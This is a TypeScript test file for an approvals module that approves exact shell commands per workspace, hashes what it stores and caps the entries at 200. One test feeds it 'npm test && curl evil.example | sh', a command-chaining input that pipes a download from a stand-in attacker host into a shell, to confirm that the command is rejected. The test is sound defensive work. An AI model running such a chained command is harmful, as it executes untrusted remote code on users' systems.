import { mkdtemp, readFile, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { describe, expect, it, onTestFinished } from "vitest";
import { createCheckApprovals } from "../server/approvals";

async function tempDir(prefix: string) {
  const dir = await mkdtemp(join(tmpdir(), prefix));
  onTestFinished(() => rm(dir, { recursive: true, force: true }));
  return dir;
}

describe("check approvals", () => {
  it("approves one exact command per workspace, persisted under salted hashes", async () => {
    const dir = await tempDir("tr-appr-");
    const ws = await tempDir("tr-appr-ws-");
    const approvals = createCheckApprovals(dir);
    expect(await approvals.isApproved(ws, "npm test")).toBe(false);
    await approvals.approve(ws, "npm test");
    expect(await approvals.isApproved(ws, "npm test")).toBe(true);
    expect(await approvals.isApproved(ws, "npm test && curl evil.example | sh")).toBe(false);
    expect(await approvals.isApproved(join(ws, ".."), "npm test")).toBe(false);

    const text = await readFile(join(dir, "check-approvals.json"), "utf8");
    expect(text).not.toContain(ws);
    expect(text).not.toContain("npm test");
    expect(await createCheckApprovals(dir).isApproved(ws, "npm test")).toBe(true);
  });

  it("keeps at most 200 approvals, dropping the oldest", async () => {
    const dir = await tempDir("tr-appr-");
    const approvals = createCheckApprovals(dir);
    for (let i = 0; i < 201; i++) await approvals.approve(`/ws/${i}`, "npm test");
    expect(await approvals.isApproved("/ws/0", "npm test")).toBe(false);
    expect(await approvals.isApproved("/ws/1", "npm test")).toBe(true);
    expect(JSON.parse(await readFile(join(dir, "check-approvals.json"), "utf8")).approvals).toHaveLength(200);
  });

  it("starts empty from an unreadable file and works in memory without a directory", async () => {
    const dir = await tempDir("tr-appr-");
    await writeFile(join(dir, "check-approvals.json"), "{ not json");
    expect(await createCheckApprovals(dir).isApproved("/ws", "npm test")).toBe(false);
    const memory = createCheckApprovals(null);
    await memory.approve("/ws", "npm test");
    expect(await memory.isApproved("/ws", "npm test")).toBe(true);
  });
});
